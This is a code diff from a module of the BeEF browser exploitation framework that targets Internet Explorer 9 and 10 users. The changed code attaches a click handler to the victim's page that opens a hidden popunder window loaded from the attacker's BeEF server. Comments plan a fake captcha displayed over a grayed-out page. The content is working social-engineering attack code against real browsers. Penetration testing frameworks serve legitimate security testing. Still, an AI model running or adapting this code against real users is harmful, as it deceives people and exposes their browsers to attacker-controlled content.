@@ -7,7 +7,7 @@
 beef.execute(function() {
 	if(beef.browser.isIE()){
 
-       getLanguage = function(){
+        var getLanguage = function(){
            var lang = null;
            switch (beef.browser.getBrowserLanguage().substring(0,2)){
                case "en":
@@ -20,7 +20,7 @@ beef.execute(function() {
            return lang;
        };
 
-        grayOut = function(vis, options) {
+        var grayOut = function(vis, options) {
             var options = options || {};
             var zindex = options.zindex || 50;
             var opacity = options.opacity || 70;
@@ -55,18 +55,21 @@ beef.execute(function() {
             }
         };
 
-        spawnPopunder = function(){
-            //TODO this will be replaced with a webpage served by BeEF
-            var pu = window.open('popunder.html','','top=0, left=0,width=500,height=500');
+        function spawnPopunder(){
+            var url = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port + '/underpop.html'
+            var pu = window.open(url,'','top=0, left=0,width=500,height=500');
             pu.blur();
-        };
+        }
 
         if(beef.browser.isIE9()){
            // [TAB] + shortcut
-            $(document.body).attr('onclick', 'spawnPopunder();');
+            document.body.onclick = function (){spawnPopunder();};
         }else if(beef.browser.isIE10()){
            // just shortcut
-            $(document.body).attr('onclick', 'spawnPopunder();');
+            document.body.onclick = function (){spawnPopunder();};
+            //TODO using TAB+R works delivering this via BeEF, but it should work without Tab too.
+            // Probably there are some issues with the popunder focus and blur
+            //setTimeout(function (){spawnPopunder();}, 1000);
 
             //TODO Using Gray-out, display the fake captcha with the 2 gifs (base64 the gif content and use dataURI inline image)
         }else{
